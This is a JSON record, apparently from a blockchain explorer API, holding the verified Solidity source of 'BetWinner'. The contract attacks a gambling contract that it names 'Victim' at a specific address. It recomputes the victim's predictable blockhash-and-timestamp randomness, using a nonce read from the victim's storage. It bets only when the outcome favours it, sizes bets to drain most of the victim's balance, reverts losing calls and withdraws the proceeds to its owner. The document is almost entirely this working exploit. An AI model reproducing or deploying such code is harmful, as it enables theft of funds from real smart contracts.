{"status":"1","message":"OK","result":[{"SourceCode":"contract Victim {\r\n    function doBet(uint[] memory playid,uint[] memory betMoney,uint[] memory betContent,uint mutiply) public payable returns (bytes32 queryId);\r\n}\r\n\r\n\r\ncontract BetWinner {\r\n    uint randonce;\r\n\taddress payable owner;\r\n\tVictim victim;\r\n\t\r\n\tconstructor(Victim v) public {\r\n\t\towner = msg.sender;\r\n\t\tvictim = v;\r\n\t}\r\n\t\r\n\tfunction () payable external {\r\n\t}\r\n\r\n\tmodifier onlyOwner() {\r\n\t\trequire(msg.sender == owner);\r\n\t\t_;\r\n\t}\r\n\t\r\n\t//\r\n\t// w3.eth.getStorageAt(\"0x77F54E6a0ED49e8Ce5155468FeAEC29368B10465\",7)\r\n\t//\r\n\tfunction setNonce(uint nonce) external onlyOwner {\r\n\t\trandonce = nonce;\r\n\t}\r\n\t\r\n\tfunction getMaxBet() public view onlyOwner returns (uint) {\r\n\t    return address(victim).balance * 80 / 100 * 10 / 19 - 1000;\r\n\t}\r\n\t\r\n\tfunction  doBet(uint weiValOverride) payable external onlyOwner {\r\n\t    uint weiVal = weiValOverride;\r\n\t    if (weiVal == 0) {\r\n\t        weiVal = getMaxBet();\r\n\t    }\r\n\t\t\r\n\t\tuint before = address(this).balance;\r\n\t\t\r\n\t    (uint betInfo, uint randonceNew) = getBet(randonce);\r\n\t\t\r\n\t\tif (betInfo != 2) {\r\n\t\t\t// call victim\r\n\t\t\tuint[] memory playid = new uint[](1);\r\n\t\t\tplayid[0] = betInfo;\r\n\t\t\t\r\n\t\t\tuint[] memory betMoney = new uint[](1);\r\n\t\t\tbetMoney[0] = weiVal;\r\n\t\t\t\r\n\t\t\tuint[] memory betContent = new uint[](1);\r\n\t\t\tbetContent[0] = betInfo;\r\n\t\t\tvictim.doBet.value(weiVal)(playid, betMoney, betContent,1);\r\n\t\t\t\r\n\t\t\tuint post = address(this).balance;\r\n\t\t\trequire(before < post, \"Sanity check\");\r\n    \t    randonce = randonceNew;\r\n\t\t}\r\n\r\n\t}\r\n\t\r\n    function getBet(uint randonce) public view onlyOwner returns (uint betInfo, uint randonceNew)  {\r\n\t\tuint[4] memory codes = [uint(0),0,0,0];//Winning numbers\r\n\r\n\t\tbytes32 code0hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));\r\n\t\trandonce  = randonce + uint(code0hash)%1000;\r\n\t\tcodes[0] = uint(code0hash) % 52 + 1;\r\n\r\n\t\tbytes32 code1hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));\r\n\t\trandonce  = randonce + uint(code1hash)%1000;\r\n\t\tcodes[1] = uint(code1hash) % 52 + 1;\r\n\r\n\t\tbytes32 code2hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));\r\n\t\trandonce  = randonce + uint(code2hash)%1000;\r\n\t\tcodes[2] = uint(code2hash) % 52 + 1;\r\n\r\n\t\tbytes32 code3hash = keccak256(abi.encodePacked(blockhash(block.number-1), now,address(this),randonce));\r\n\t\trandonce  = randonce + uint(code3hash)%1000;\r\n\t\tcodes[3] = uint(code3hash) % 52 + 1;\r\n\r\n\t\t// check winner\r\n\t\tuint code0 = codes[0]%13==0?13:codes[0]%13;\r\n\t\tuint code1 = codes[1]%13==0?13:codes[1]%13;\r\n\t\tuint code2 = codes[2]%13==0?13:codes[2]%13;\r\n\t\tuint code3 = codes[3]%13==0?13:codes[3]%13;\r\n\t\tuint  onecount = code0 + code2;\r\n\t\tuint  twocount = code1 + code3;\r\n\t\tonecount = onecount%10;\r\n\t\ttwocount = twocount%10;\r\n\t\t  \r\n\t\tbetInfo = 2;\r\n\t\tif(onecount > twocount){\r\n\t\t\tbetInfo = 1;\r\n\t\t} else if (onecount < twocount){\r\n\t\t\tbetInfo = 3;\r\n\t\t}\r\n\t\treturn (betInfo, randonce);\r\n    }\r\n\t\r\n\tfunction withdraw() external onlyOwner{\r\n\t\towner.transfer((address(this).balance));\r\n\t}\r\n\r\n\r\n}","ABI":"[{\"constant\":true,\"inputs\":[{\"name\":\"randonce\",\"type\":\"uint256\"}],\"name\":\"getBet\",\"outputs\":[{\"name\":\"betInfo\",\"type\":\"uint256\"},{\"name\":\"randonceNew\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"constant\":true,\"inputs\":[],\"name\":\"getMaxBet\",\"outputs\":[{\"name\":\"\",\"type\":\"uint256\"}],\"payable\":false,\"stateMutability\":\"view\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"weiValOverride\",\"type\":\"uint256\"}],\"name\":\"doBet\",\"outputs\":[],\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"function\"},{\"constant\":false,\"inputs\":[{\"name\":\"nonce\",\"type\":\"uint256\"}],\"name\":\"setNonce\",\"outputs\":[],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"name\":\"v\",\"type\":\"address\"}],\"payable\":false,\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"payable\":true,\"stateMutability\":\"payable\",\"type\":\"fallback\"}]","ContractName":"BetWinner","CompilerVersion":"v0.5.1+commit.c8a2cb62","OptimizationUsed":"0","Runs":"200","ConstructorArguments":"00000000000000000000000077F54E6a0ED49e8Ce5155468FeAEC29368B10465","Library":"","SwarmSource":"bzzr://117216b87f36316ef86adb981440a345ae1f2d52d06a22f08547f5f54a3ca98a"}]}